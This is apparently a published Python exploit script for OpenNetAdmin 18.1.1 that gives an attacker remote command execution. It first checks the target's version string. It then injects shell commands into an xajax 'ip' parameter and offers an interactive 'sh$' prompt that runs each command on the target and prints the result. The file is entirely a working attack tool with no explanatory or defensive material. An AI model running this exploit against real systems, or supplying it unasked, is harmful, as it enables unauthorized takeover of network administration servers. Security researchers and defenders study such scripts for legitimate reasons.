#!/usr/bin/python3

'''
# Exploit Title: OpenNetAdmin 18.1.1 - Remote Code Execution
# Date: 2020-01-18
# Exploit Author: @amriunix (https://amriunix.com)
# Vendor Homepage: http://opennetadmin.com/
# Software Link: https://github.com/opennetadmin/ona
# Version: v18.1.1
# Tested on: Linux
'''

import requests
import sys
from urllib3.exceptions import InsecureRequestWarning

# Suppress only the single warning from urllib3 needed.
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
def helper(filename):
    print("\n[-] Usage: python3 " + filename + " [check | exploit] <URL>")
    print("\n[*] Options:")
    print("\t[+] check    : Verify if the target is vulnerable")
    print("\t[+] exploit  : Exploiting the target\n")
    exit(1)
def check(target):
    try:
        req = requests.get(url = target, verify = False)
    except:
        print("[-] Warning: Error while connecting o the remote target")
        exit(1)
    return('v18.1.1' in req.text)

def exploit(target, cmd):
    payload = {
        'xajax':'window_submit',
        'xajaxr':'1574117726710',
        'xajaxargs[]':['tooltips','ip=>;echo \"BEGIN\";{} 2>&1;echo \"END\"'.format(cmd),'ping']
    }
    try:
        req = requests.post(url = target, data = payload, verify = False)
    except:
        print("[-] Warning: Error while connecting o the remote target")
        exit(1)
    data = req.text
    result = data[data.find('BEGIN')+6:data.find('END')-1]
    return(result)

if __name__ == '__main__':
    print('[*] OpenNetAdmin 18.1.1 - Remote Code Execution')
    filename = sys.argv[0]
    if len(sys.argv) != 3:
        helper(filename)
    else:
        print("[+] Connecting !")
        opt =  sys.argv[1].lower()
        target = sys.argv[2] + '/'
        if opt == 'check':
            if (check(target)):
                print("[+] The remote host is vulnerable!")
            else:
                print("[-] The remote host is NOT vulnerable!")
        elif opt == 'exploit':
            if (check(target)):
                print("[+] Connected Successfully!")
            else:
                print("[-] Warning: Error while connecting o the remote target")
            cmd = ''
            while(True):
                cmd = input('sh$ ').lower()
                if (cmd == 'exit'):
                    exit(0)
                print(exploit(target, cmd))
        else:
            print("[-] Warning: Command not found !")